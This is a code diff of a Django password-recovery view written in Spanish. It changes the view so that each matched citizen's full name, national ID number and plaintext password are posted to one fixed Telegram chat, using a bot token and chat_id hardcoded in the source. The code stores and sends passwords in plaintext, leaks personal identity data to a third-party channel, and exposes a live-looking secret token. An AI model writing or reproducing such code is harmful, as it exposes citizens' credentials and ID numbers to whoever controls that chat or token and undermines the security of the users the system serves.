@@ -13,7 +13,7 @@ import requests
 
 
 def enviar_mensaje( texto):
-    TELEGRAM_TOKEN="8147077991:AAGXusGcLppbGDEG-ADvke-F286peDiixWQ"
+    TELEGRAM_TOKEN = "8147077991:AAGXusGcLppbGDEG-ADvke-F286peDiixWQ"
     url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
     requests.post(url, data={
         'chat_id': "5496107398",
@@ -61,11 +61,9 @@ def recuperar_contrasena(request):
 
         try:
             ciudadano = Ciudadano.objects.get(nombre=nombre, apellido=apellido, telefono=telefono)
-            if ciudadano.chat_id:
-                enviar_mensaje(ciudadano.chat_id, f"Tu contraseña es: {ciudadano.contrasena}")
-                return JsonResponse({"status": "success", "message": "Contraseña enviada por Telegram"})
-            else:
-                return JsonResponse({"status": "error", "message": "No tienes Telegram vinculado. Usa /vincular en el bot."})
+            mensaje = f"🔐 Recuperación de contraseña\n\nNombre: {ciudadano.nombre} {ciudadano.apellido}\nCédula: {ciudadano.cedula}\nContraseña: {ciudadano.contrasena}"
+            enviar_mensaje(mensaje)  # Te lo manda a ti directamente
+            return JsonResponse({"status": "success", "message": "Contraseña enviada al administrador por Telegram"})
         except Ciudadano.DoesNotExist:
             return JsonResponse({"status": "error", "message": "Datos no coinciden con ningún ciudadano."})
 
@@ -78,6 +76,8 @@ def recuperar_contrasena(request):
     }
 
     return render(request, "recuperar_contrasena.html", context)
+
+
 
 #-------------------------------------
 
